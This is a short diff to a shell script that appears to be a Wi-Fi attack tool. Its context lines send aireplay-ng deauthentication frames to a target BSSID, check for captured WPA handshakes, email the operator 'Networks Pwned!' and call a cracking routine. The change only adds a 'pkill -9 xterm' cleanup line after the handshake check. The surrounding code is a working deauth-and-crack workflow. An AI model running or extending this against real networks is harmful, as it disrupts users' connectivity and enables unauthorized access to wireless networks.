@@ -234,6 +234,7 @@ xterm -e aireplay-ng --deauth 20 -a $bssid $foo
 echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
 check_cap_files
 sleep 3
+pkill -9 xterm
 echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email
 crack
 }
@@ -247,6 +248,7 @@ echo -e "[${Green}${foo}${White}] Sending DeAuth to target..."
 xterm -e aireplay-ng --deauth 20 -a $bssid $foo
 echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
 check_cap_files
+pkill -9 xterm
 crack
 }
 
